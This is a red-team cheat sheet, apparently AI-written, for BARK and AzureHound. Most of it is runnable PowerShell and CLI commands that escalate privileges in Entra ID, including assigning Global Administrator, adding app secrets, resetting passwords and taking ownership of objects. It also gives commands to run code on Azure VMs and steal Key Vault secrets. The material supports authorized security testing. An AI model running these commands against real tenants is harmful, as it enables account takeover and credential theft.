# BARK

**Tags:** `#bark` `#azuread` `#entraid` `#microsoft365` `#cloud` `#postexploitation` `#abusepath` `#powershell` `#bloodhound`

BloodHound Attack Research Kit — PowerShell library for executing Azure AD / Entra ID attack primitives. Not an enumeration tool; it's a targeted execution tool. Each function performs one specific abuse (add member to group, grant app role, reset password, add secret to SP, etc.) that directly maps to BloodHound Azure attack edges. Use after BloodHound / roadrecon has identified a path.

**Source:** https://github.com/BloodHoundAD/BARK
**AzureHound (data collector):** https://github.com/SpecterOps/AzureHound (moved from BloodHoundAD)
**Install:**
```powershell
git clone https://github.com/BloodHoundAD/BARK
. .\BARK.ps1
```

> [!note] **BARK workflow** — Collect with AzureHound → import into BloodHound → identify attack path → execute each hop with the matching BARK primitive. BARK functions map to BloodHound Azure edges.

> [!warning] **BARK was renamed — the old `Invoke-AZ*` / `Get-AZ*` names are gone.** Current BARK uses **`*-Entra*`** for the direct actions (`Add-MemberToEntraGroup`, `New-EntraRoleAssignment`, `New-EntraAppSecret`, `Set-EntraUserPassword`, `New-EntraAppOwner`…), **`Get-All*` / `Get-Entra*`** for recon, **`*-AzureRM*`** for Azure resource attacks, and **`Test-MG*` / `Test-AzureRM*`** for the edge-abuse *validation* primitives (usually driven by the `Invoke-All*AbuseTests` runners, not by hand). Anything below reflects the current module — verify with `Get-Command -Module BARK` or `Get-ChildItem function:\*Entra*`.

> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] Service Principal & App Registration Abuse section; collect the graph with [[Tools/Cloud/AzureHound|AzureHound]], analyse in [[Tools/AD/BloodHound|BloodHound]].

---

## AzureHound — BloodHound Data Collection

```bash
# Collect all Azure AD + Azure resource relationships
./azurehound -u "user@company.com" -p "Password1" list --tenant "<tenant-id>" -o output.json

# With access token
./azurehound -j "<access-token>" list --tenant "<tenant-id>" -o output.json

# Specific collections
./azurehound list users --tenant "<tenant-id>"
./azurehound list groups --tenant "<tenant-id>"
./azurehound list roles --tenant "<tenant-id>"
./azurehound list service-principals --tenant "<tenant-id>"
./azurehound list az-role-assignments --tenant "<tenant-id>"

# Import into BloodHound: drag and drop output.json into the UI
```

---

## Authentication

BARK works with raw tokens rather than Az module sessions.

```powershell
# Get MS Graph token interactively
$token = Get-MSGraphTokenWithUsernamePassword -TenantID <tid> -Username <upn> -Password <pw>

# From client credentials (service principal)
$token = Get-MSGraphTokenWithClientCredentials `
  -ClientID <app-id> -ClientSecret <secret> -TenantID <tid>

# From refresh token
$token = Get-MSGraphTokenWithRefreshToken -RefreshToken <rt> -TenantID <tid>

# For Azure Resource Manager (ARM) attacks you need an ARM-audience token instead:
$armToken = Get-AzureRMTokenWithRefreshToken -RefreshToken <rt> -TenantID <tid>

# Inspect a token's claims (scp/roles/aud) — there is no Test-MGToken; decode instead
Parse-JWTToken -Token $token
```

---

## Group Manipulation (AZAddMember edge)

```powershell
# Add a principal to a group
Add-MemberToEntraGroup `
  -TargetGroupId "<group-object-id>" `
  -PrincipalID "<user-object-id>" `
  -Token $token

# Get group members
Get-EntraGroupMembers -GroupID "<group-object-id>" -Token $token
```

---

## Role Assignments (AZHasRole / AZAddSelfToRole edge)

```powershell
# Assign a directory role to a principal
New-EntraRoleAssignment `
  -PrincipalID "<user-object-id>" `
  -RoleDefinitionID "62e90394-69f5-4237-9190-012177145e10" `  # Global Administrator
  -Token $token
```

**Common role definition IDs:**

| Role | ID |
|---|---|
| Global Administrator | `62e90394-69f5-4237-9190-012177145e10` |
| Privileged Role Administrator | `e8611ab8-c189-46e8-94e1-60213ab1f814` |
| Application Administrator | `9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3` |
| User Administrator | `fe930be7-5e62-47db-91af-98c3a49a38b1` |
| Authentication Administrator | `c4e39bd9-1100-46d3-8c65-fb160da0071f` |

---

## App & SP Secret Abuse (AZAddSecret edge)

```powershell
# Add a secret/password to an app registration (needs Application.ReadWrite.All or app ownership)
New-EntraAppSecret `
  -AppRegObjectID "<app-registration-object-id>" `
  -Token $token
# Returns a new client secret — use it with the app's client ID to auth AS that application

# Add a secret to a service principal
New-EntraServicePrincipalSecret `
  -ServicePrincipalID "<sp-object-id>" `
  -Token $token
```

---

## App Role Grants (AZMGGrantAppRoles edge)

```powershell
# Grant an MS Graph app role to a service principal (needs AppRoleAssignment.ReadWrite.All)
# E.g. grant RoleManagement.ReadWrite.Directory for full role control
New-EntraAppRoleAssignment `
  -SPObjectID "<service-principal-object-id>" `
  -AppRoleID "<app-role-id>" `
  -ResourceID "<ms-graph-sp-object-id>" `
  -Token $token
# List assignable MS Graph app roles first:
Get-MGAppRoles -Token $token
```

**Useful MS Graph app role IDs:**

| Permission | ID |
|---|---|
| RoleManagement.ReadWrite.Directory | `9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8` |
| Directory.ReadWrite.All | `19dbc75e-c2e2-444c-a770-ec69d8559fc7` |
| AppRoleAssignment.ReadWrite.All | `06b708a9-e830-4db3-a914-8e69da51d44f` |

---

## Password Reset (AZResetPassword edge)

```powershell
# Reset a user's password (needs Authentication Administrator or higher)
Set-EntraUserPassword `
  -TargetUserID "<user-object-id>" `
  -Password "P@ssw0rd123!" `
  -Token $token
# Reset-EntraUserPassword also exists as an alternate.
```

---

## Ownership Abuse (AZOwns edge)

If your account owns (or can add itself as owner of) an app/SP/group, you can escalate through it.

```powershell
# Add an owner to an app registration
New-EntraAppOwner `
  -AppObjectID "<app-object-id>" `
  -NewOwnerObjectID "<your-user-object-id>" `
  -Token $token

# Add an owner to a service principal
New-EntraServicePrincipalOwner `
  -ServicePrincipalObjectID "<sp-object-id>" `
  -NewOwnerObjectID "<your-user-object-id>" `
  -Token $token

# Add an owner to a group
New-EntraGroupOwner `
  -GroupObjectID "<group-object-id>" `
  -NewOwnerObjectID "<your-user-object-id>" `
  -Token $token
```

---

## Recon

```powershell
# Bulk directory objects
Get-AllEntraUsers            -Token $token
Get-AllEntraGroups           -Token $token
Get-AllEntraApps             -Token $token
Get-AllEntraServicePrincipals -Token $token
Get-AllEntraRoles            -Token $token

# Owners of a specific app / SP / group
Get-EntraAppOwner              -AppObjectID "<app-object-id>" -Token $token
Get-EntraServicePrincipalOwner -ServicePrincipalObjectId "<sp-object-id>" -Token $token
Get-EntraGroupOwner            -GroupObjectID "<group-object-id>" -Token $token

# Highest-value targets: SPs that hold Tier Zero MS Graph app roles (DA-equivalent in the cloud)
Get-EntraTierZeroServicePrincipals -Token $token
```

---

## Azure Resource Manager (ARM) Abuse

BARK also attacks Azure *resources* (needs an ARM-audience token — `Get-AzureRMTokenWith*`). These are the highest-impact primitives: command exec on VMs, secret theft from Key Vaults, Function App keys.

```powershell
# Enumerate what you can reach (VM/KeyVault enum take -SubscriptionID from the sub list)
Get-AllAzureRMSubscriptions   -Token $armToken
Get-AllAzureRMVirtualMachines -Token $armToken -SubscriptionID "<sub-id>"
Get-AllAzureRMKeyVaults       -Token $armToken -SubscriptionID "<sub-id>"

# Run a command as SYSTEM/root on a VM (Microsoft.Compute/.../runCommand)
Invoke-AzureRMVMRunCommand `
  -TargetVMId "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Compute/virtualMachines/<vm>" `
  -Script "whoami" `
  -Token $armToken

# Pull a Key Vault secret value
Get-AzureRMKeyVaultSecretValue -KeyVaultSecretID "https://<vault>.vault.azure.net/secrets/<name>" -Token $keyVaultToken

# Function App master keys → invoke/backdoor functions
Get-AzureFunctionAppMasterKeys -Token $armToken -PathToFunctionApp "<function-app-resource-id>"
```

---

## "What can I actually abuse?" — abuse-test runners

BARK's `Test-MG*` / `Test-AzureRM*` primitives validate each BloodHound edge against a token. Rather than call them individually (they expect a Global-Admin comparison token), run the suite:

```powershell
# Run every MS Graph / Entra abuse test with your token and report what succeeds
Invoke-AllEntraAbuseTests   -GlobalAdminClientID <ga-app-id> -GlobalAdminSecret <secret> -TenantName company.onmicrosoft.com
Invoke-AllAzureRMAbuseTests -Token $armToken
Invoke-AllAzureMGAbuseTests -Token $token
```

---

*Created: 2026-03-06*
*Updated: 2026-08-27*
*Model: claude-opus-5*
